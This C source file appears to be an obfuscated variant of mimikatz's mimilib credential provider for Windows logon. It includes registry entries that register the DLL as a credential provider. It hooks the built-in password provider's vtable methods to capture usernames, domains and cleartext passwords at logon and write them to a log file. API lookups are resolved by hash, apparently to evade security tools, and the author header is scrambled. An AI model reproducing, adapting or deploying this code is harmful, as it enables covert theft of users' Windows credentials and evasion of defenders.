/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr

	lKhLxhrZ2YRmexx
	http://BHnDh1IK8pOXBk / http://yNpxH7CDAsNEViP1
	sqCZ0pbzEXCF7Mo2K73WnaJi

	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kcrEdentialprovider.h"
#include "..\mimilib\api_resolver.h"
/* Register
 * ========

Windows Registry Editor Version 5.00

[HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
@="mimilib"

[HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
@="mimilib"

[HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}\InprocServer32]
@="mimilib.dll"
"ThreadingModel"="Apartment"

[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
@="mimilib"

[HKEY_CLASSES_ROOT\CLSID\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
@="mimilib"

[HKEY_CLASSES_ROOT\CLSID\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}\InprocServer32]
@="mimilib.dll"
"ThreadingModel"="Apartment"

 * Unregister
 * ==========

Windows Registry Editor Version 5.00

[-HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
[-HKEY_CLASSES_ROOT\WOW6432Node\CLSID\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
[-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]
[-HKEY_CLASSES_ROOT\CLSID\{DC2EB890-F593-4E6D-A085-E8C112CFBEC4}]

*/

DEFINE_GUID(IID_ICredentialProvider, 0xd27c3481, 0x5a1c, 0x45b2, 0x8a, 0xaa, 0xc2, 0x0e, 0xbb, 0xe8, 0x22, 0x9e); // d27c3481-5a1c-45b2-8aaa-c20ebbe8229e
DEFINE_GUID(CLSID_PasswordCredentialProvider, 0x60b78e88, 0xead8, 0x445c, 0x9c, 0xfd, 0x0b, 0x87, 0xf7, 0x4e, 0xa6, 0xcd); // 60b78e88-ead8-445c-9cfd-0b87f74ea6cd

static LONG g_cRef = 0;   // global dll reference count

NTSTATUS NTAPI kredentialProvider_log(PWSTR szDomain, PWSTR szLogin, PWSTR szPassword)
{
	FILE* ksSp_logfile;
#pragma warning(push)
#pragma warning(disable:4996)
	if (ksSp_logfile = _wfopen(L"kcrEdentialprovider.log", L"a"))
#pragma warning(pop)
	{
		klog(ksSp_logfile, L"%s\\%s\t%s\n", szDomain, szLogin, szPassword);
		fclose(ksSp_logfile);
	}
	return STATUS_SUCCESS;
}

GetSerializationType GetSerializationOld;
//HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID pcpgsr, /* [out] */ CREDENTIAL_PROVIDER_CREDENTIAL_SERIALIZATION* pcpcs, /* [out] */ LPWSTR* ppszOptionalStatusText, /* [out] */ PVOID pcpsiOptionalStatusIcon)
//{
//	GetSerializationType ser = NULL;
//	HRESULT hr;
//	TCHAR szUser[256], szPassword[256], szDomain[256], szPasswordClearText[256];
//	DWORD dwUserLen = ARRAYSIZE(szUser), dwPasswordLen = ARRAYSIZE(szPassword), dwDomainLen = ARRAYSIZE(szDomain), dwPasswordClearTextLen = ARRAYSIZE(szPasswordClearText);
//	CRED_PROTECTION_TYPE ctype;
//	HMODULE hAdvApi32, hCredUI;
//	CredUnPackAuthenticationBufferWFct* CredUnPackAuthenticationBufferInst;
//	CredIsProtectedWFct* CredIsProtectedInst;
//	CredUnprotectWFct* CredUnprotectWInst;
//
//
//	PDWORD functionAddress = getFunctionAddressByHash((char*)"kernel32", 0x003db390f);
//	customGetProcAddress GetProcAddress_ = (customGetProcAddress) functionAddress;
//
//	PDWORD functionAddress2 = getFunctionAddressByHash((char*)"kernel32", 0x006b80253);
//	customLoadLibraryW LoadLibraryA = (customLoadLibraryW) functionAddress2;
//
//	if (GetSerializationOld == NULL)
//		return E_NOTIMPL;
//
//	hr = GetSerializationOld(This, pcpgsr, pcpcs, ppszOptionalStatusText, pcpsiOptionalStatusIcon);
//	if (!SUCCEEDED(hr))
//	{
//		return hr;
//	}
//
//	//hCredUI = LoadLibrary(L"Credui.dll");
//	hCredUI = LoadLibraryA(L"Credui.dll");
//	if(hCredUI)
//	{
//		//hAdvApi32 = LoadLibrary(L"advapi32.dll");
//		hAdvApi32 = LoadLibraryA(L"advapi32.dll");
//		if(hAdvApi32)
//		{
//
//			//CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)GetProcAddress(hCredUI, "CredUnPackAuthenticationBufferW");
//			CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)GetProcAddress_(hCredUI, "CredUnPackAuthenticationBufferW");
//			//CredIsProtectedInst = (CredIsProtectedWFct*)GetProcAddress(hAdvApi32, "CredIsProtectedW");
//			CredIsProtectedInst = (CredIsProtectedWFct*)GetProcAddress_(hAdvApi32, "CredIsProtectedW");
//			//CredUnprotectWInst = (CredUnprotectWFct*)GetProcAddress(hAdvApi32, "CredUnprotectW");
//			CredUnprotectWInst = (CredUnprotectWFct*)GetProcAddress_(hAdvApi32, "CredUnprotectW");
//
//			if(CredUnPackAuthenticationBufferInst && CredIsProtectedInst && CredUnprotectWInst)
//			{
//				if(CredUnPackAuthenticationBufferInst(0, pcpcs->rgbSerialization, pcpcs->cbSerialization, szUser, &dwUserLen, szDomain, &dwDomainLen, szPassword, &dwPasswordLen))
//				{
//					if (CredIsProtectedInst(szPassword, &ctype))
//					{
//						if (CredUnprotectWInst(TRUE, szPassword, dwPasswordLen, szPasswordClearText, &dwPasswordClearTextLen))
//						{
//							kredentialProvider_log(szDomain, szUser, szPasswordClearText);
//						}
//						else hr = GetLastError();
//					}
//					else
//					{
//						kredentialProvider_log(szDomain, szUser, szPassword);
//					}
//				}
//				else hr = GetLastError();
//			}
//			else hr = E_POINTER;
//
//			FreeModule(hAdvApi32);
//		}
//		else hr = E_HANDLE;
//
//		FreeModule(hCredUI);
//	}
//	else hr = E_HANDLE;
//
//	return hr;
//}

HRESULT STDMETHODCALLTYPE GetSerializationNew(IUnknown* This, /* [out] */ PVOID pcpgsr, /* [out] */ CREDENTIAL_PROVIDER_CREDENTIAL_SERIALIZATION* pcpcs, /* [out] */ LPWSTR* ppszOptionalStatusText,/* [out] */ PVOID pcpsiOptionalStatusIcon)
{
	GetSerializationType ser = NULL;
	HRESULT hr;
	TCHAR szUser[256], szPassword[256], szDomain[256], szPasswordClearText[256];
	DWORD dwUserLen = ARRAYSIZE(szUser), dwPasswordLen = ARRAYSIZE(szPassword),
		dwDomainLen = ARRAYSIZE(szDomain), dwPasswordClearTextLen = ARRAYSIZE(szPasswordClearText);
	CRED_PROTECTION_TYPE ctype;
	HMODULE hAdvApi32, hCredUI;
	CredUnPackAuthenticationBufferWFct* CredUnPackAuthenticationBufferInst;
	CredIsProtectedWFct* CredIsProtectedInst;
	CredUnprotectWFct* CredUnprotectWInst;

	// Verifica que tengamos la función original
	if (GetSerializationOld == NULL)
		return E_NOTIMPL;

	// Ejecuta la original primero
	hr = GetSerializationOld(This, pcpgsr, pcpcs, ppszOptionalStatusText, pcpsiOptionalStatusIcon);
	if (!SUCCEEDED(hr))
		return hr;


	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"Credui.dll");

	FARPROC fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
	customLoadLibraryW LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;
	
	if ((hCredUI = LoadLibraryW_(L"Credui.dll")))
	{
		hKernel32Base = GetModuleBaseFromPEB(L"advapi32.dll");
		fpLoadLib = getFunctionByHash(hKernel32Base, H_LoadLibraryW);
		LoadLibraryW_ = (customLoadLibraryW)fpLoadLib;

		if ((hAdvApi32 = LoadLibraryW_(L"advapi32.dll")))
		{
			// Resuelve las funciones por hash
			DWORD hashCredUnpack = getHashFromString("CredUnPackAuthenticationBufferW");
			DWORD hashCredIsProt = getHashFromString("CredIsProtectedW");
			DWORD hashCredUnprot = getHashFromString("CredUnprotectW");

			CredUnPackAuthenticationBufferInst = (CredUnPackAuthenticationBufferWFct*)getFunctionByHash(hCredUI, hashCredUnpack);
			CredIsProtectedInst = (CredIsProtectedWFct*)getFunctionByHash(hAdvApi32, hashCredIsProt);
			CredUnprotectWInst = (CredUnprotectWFct*)getFunctionByHash(hAdvApi32, hashCredUnprot);

			if (CredUnPackAuthenticationBufferInst && CredIsProtectedInst && CredUnprotectWInst)
			{
				if (CredUnPackAuthenticationBufferInst(0, pcpcs->rgbSerialization, pcpcs->cbSerialization,
					szUser, &dwUserLen, szDomain, &dwDomainLen, szPassword, &dwPasswordLen))
				{
					if (CredIsProtectedInst(szPassword, &ctype))
					{
						if (CredUnprotectWInst(TRUE, szPassword, dwPasswordLen, szPasswordClearText, &dwPasswordClearTextLen))
						{
							kredentialProvider_log(szDomain, szUser, szPasswordClearText);
						}
						else hr = GetLastError();
					}
					else
					{
						kredentialProvider_log(szDomain, szUser, szPassword);
					}
				}
				else hr = GetLastError();
			}
			else hr = E_POINTER;

			FreeLibrary(hAdvApi32);
		}
		else hr = E_HANDLE;

		FreeLibrary(hCredUI);
	}
	else hr = E_HANDLE;

	return hr;
}


GetCredentialAtType GetCredentialAtOld;
HRESULT(STDMETHODCALLTYPE GetCredentialAt)(IUnknown* This, DWORD dwIndex, ICredentialProviderCredential** ppcpc)
{
	HRESULT hr = GetCredentialAtOld(This, dwIndex, ppcpc);
	DWORD dwOld;
	if (!SUCCEEDED(hr))
	{
		return hr;
	}

	if ((*ppcpc)->lpVtbl->GetSerialization == GetSerializationNew)
		return hr;

	GetSerializationOld = (*ppcpc)->lpVtbl->GetSerialization;

	if (!VirtualProtect(&((*ppcpc)->lpVtbl->GetSerialization), sizeof(LONG_PTR), PAGE_EXECUTE_READWRITE, &dwOld))
	{
		return hr;
	}

	(*ppcpc)->lpVtbl->GetSerialization = GetSerializationNew;

	VirtualProtect(&((*ppcpc)->lpVtbl->GetSerialization), sizeof(LONG_PTR), dwOld, &dwOld); // just in case...

	return hr;
}

// Boilerplate method to create an instance of our provider. 
HRESULT CEIDProvider_CreateInstance(REFIID riid, void** ppv)
{
	HRESULT hr;
	ICredentialProvider* object = NULL;
	DWORD dwOld = 0;
	
	if (!IsEqualIID(riid, (PVOID)&IID_ICredentialProvider))
	{
		return E_NOINTERFACE;
	}

	hr = CoCreateInstance(&CLSID_PasswordCredentialProvider, NULL, CLSCTX_INPROC_SERVER, riid, (PVOID*)&object);
	if (!SUCCEEDED(hr))
	{
		return E_NOINTERFACE;
	}

	GetCredentialAtOld = (GetCredentialAtType)object->lpVtbl->GetCredentialAt;

	if (!VirtualProtect(&(object->lpVtbl->GetCredentialAt), sizeof(LONG_PTR), PAGE_EXECUTE_READWRITE, &dwOld))
	{
		return E_NOINTERFACE;
	}
	object->lpVtbl->GetCredentialAt = GetCredentialAt;

	VirtualProtect(&(object->lpVtbl->GetCredentialAt), sizeof(LONG_PTR), dwOld, &dwOld); // just in case

	*ppv = NULL;
	object->lpVtbl->Release(object);
	
	return E_NOINTERFACE;
}

ULONG STDMETHODCALLTYPE CClassFactoryAddRef(__RPC__in IClassFactory* This)
{
	return ((CClassFactory*)This)->_cRef++;
}

ULONG STDMETHODCALLTYPE CClassFactoryRelease(__RPC__in IClassFactory* This)
{
	LONG cRef = ((CClassFactory*)This)->_cRef--;
	if (!cRef)
	{
		free(This);
	}
	
	return cRef;
}

HRESULT  STDMETHODCALLTYPE CClassFactoryQueryInterface(IClassFactory* This, /* [in] */ REFIID riid, /* [annotation][iid_is][out] */ void** ppvObject)
{
	HRESULT hr;
	if (ppvObject != NULL)
	{
		if (IsEqualIID(&IID_IUnknown, riid) || IsEqualIID(&IID_IClassFactory, riid))
		{
			*ppvObject = This;
			CClassFactoryAddRef(This);
			hr = S_OK;
		}
		else
		{
			*ppvObject = NULL;
			hr = E_NOINTERFACE;
		}
	}
	else
	{
		hr = E_INVALIDARG;
	}
	
	return hr;
}

HRESULT STDMETHODCALLTYPE CClassFactoryCreateInstance(IClassFactory* This, /* [annotation][unique][in] */ IUnknown* pUnkOuter, /* [annotation][in] */ REFIID riid, /* [annotation][iid_is][out] */ void** ppvObject)
{
	HRESULT hr;
	if (!pUnkOuter)
	{
		if (IsEqualIID(&IID_ICredentialProvider, riid))
		{
			hr = CEIDProvider_CreateInstance(riid, ppvObject);
		}
	}
	else
	{
		*ppvObject = NULL;
		hr = CLASS_E_NOAGGREGATION;
	}
	
	return hr;
}

HRESULT STDMETHODCALLTYPE CClassFactoryLockServer(IClassFactory* This, /* [in] */ BOOL fLock)
{
	if (fLock)
	{
		InterlockedIncrement(&g_cRef);
	}
	else
	{
		InterlockedDecrement(&g_cRef);
	}
	
	return S_OK;
}

CONST_VTBL struct IClassFactoryVtbl factoryVtbl = {
	CClassFactoryQueryInterface,
	CClassFactoryAddRef,
	CClassFactoryRelease,
	CClassFactoryCreateInstance,
	CClassFactoryLockServer,
};

HRESULT CClassFactory_CreateInstance(REFCLSID rclsid, REFIID riid, void** ppv)
{
	HRESULT hr = E_OUTOFMEMORY;

	IClassFactory* pcf = (IClassFactory*)malloc(sizeof(CClassFactory));
	if (pcf)
	{
		((CClassFactory*)pcf)->_cRef = 0;
		pcf->lpVtbl = &factoryVtbl;

		hr = pcf->lpVtbl->QueryInterface(pcf, riid, ppv);
		pcf->lpVtbl->Release(pcf);
	}
	else
	{
		hr = E_OUTOFMEMORY;
	}
	
	return hr;
}

// DLL entry point.
STDAPI kcrEdentialprovider_DllGetClassObject(REFCLSID rclsid, REFIID riid, LPVOID FAR* ppv)
{
	return CClassFactory_CreateInstance(rclsid, riid, ppv);
}

STDAPI kcrEdentialprovider_DllCanUnloadNow()
{
	HRESULT hr;

	if (g_cRef > 0)
	{
		hr = S_FALSE;   // cocreated objects still exist, don't unload
	}
	else
	{
		hr = S_OK;      // refcount is zero, ok to unload
	}

	return hr;
}